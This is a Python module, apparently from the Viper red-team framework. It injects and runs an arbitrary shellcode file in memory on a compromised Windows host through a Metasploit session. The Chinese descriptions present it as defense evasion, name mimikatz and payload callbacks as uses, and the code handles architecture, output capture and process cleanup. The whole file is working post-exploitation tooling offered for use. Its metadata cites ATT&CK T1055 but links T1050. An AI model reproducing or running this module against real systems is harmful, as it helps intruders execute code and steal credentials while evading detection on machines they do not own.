# -*- coding: utf-8 -*-
# @File  : SimplePostPythonModule.py
# @Date  : 2019/1/12
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME = "内存执行Shellcode文件"
    DESC = "在主机内存中注入shellcode并执行,文件后缀必须为bin.\n" \
           "与 PE文件转shellcode 模块配合可以内存执行任意pe文件\n" \
           "post/windows/manage/shellcode_inject模块可实现交互式执行\n" \
           "Shellcode执行与cpu架构强相关,arch选项要填写准确.\n" \
           "如不需要shellcode输出(如payload上线),无需勾选获取输出.\n" \
           "如需要获取shellcode执行之后的输出(mimikatz),请勾选获取输出选项,并填写等待时间\n"
    MODULETYPE = TAG2CH.Defense_Evasion
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1055"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/exuqn2"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1050/"]
    AUTHOR = "Viper"

    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionFileEnum(ext=['bin']),
        OptionEnum(name='ARCH', name_tag="ARCH", desc="选择载荷的Arch平台(x86,x64)", required=True,
                   default='x64',
                   enum_list=[
                       {'name': 'x86', 'value': 'x86'},
                       {'name': 'x64', 'value': 'x64'},
                   ]),
        OptionBool(name='CHANNELIZED', name_tag="获取输出", desc="是否需要获取shellcode执行后输出结果", required=True, default=True),
        OptionInt(name='WAIT_OUTPUT', name_tag="等待输出时间(秒)", desc="shellcode执行后等待输出结果的时间(秒)(3-180)", required=True,
                  default=3),
        OptionBool(name='KILL', name_tag="关闭进程", desc="执行shellcode完成后关闭新增的进程.", required=True, default=True),

    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "windows/manage/shellcode_inject_api"

    def check(self):
        """执行前的检查函数"""
        script = self.get_fileoption_filename()
        if script is None:
            return False, "请选择执行shellcode文件,文件后缀必须为bin"
        else:
            self.set_msf_option(key='SHELLCODE_FILE', value=script)
        self.set_msf_option(key='CHANNELIZED', value=self.param('CHANNELIZED'))
        wait_ouput = self.param('WAIT_OUTPUT')
        if wait_ouput < 3:
            wait_ouput = 3
        elif wait_ouput > 180:
            wait_ouput = 180

        self.set_msf_option(key='WAIT_OUTPUT', value=wait_ouput)
        self.set_msf_option(key='KILL', value=self.param('KILL'))

        session = Session(self._sessionid)
        if session.is_alive:
            pass
        else:
            return False, "Session不可用"
        if session.is_windows:
            pass
        else:
            return False, "模块只支持Windows系统"

        if self.param('ARCH') in ["x86", "x64"]:
            self.set_msf_option(key='ARCH', value=self.param("ARCH"))
        else:
            return False, "Arch输入错误"
        return True, None

    def callback(self, status, message, data):
        if status:
            self.log_good("模块执行完成")
            self.log_good("新进程PID :{}".format(data.get("pid")))
            self.log_good("新进程输出 :{}".format(data.get("output")))
        else:
            self.log_error("模块执行失败")
            self.log_error(message)
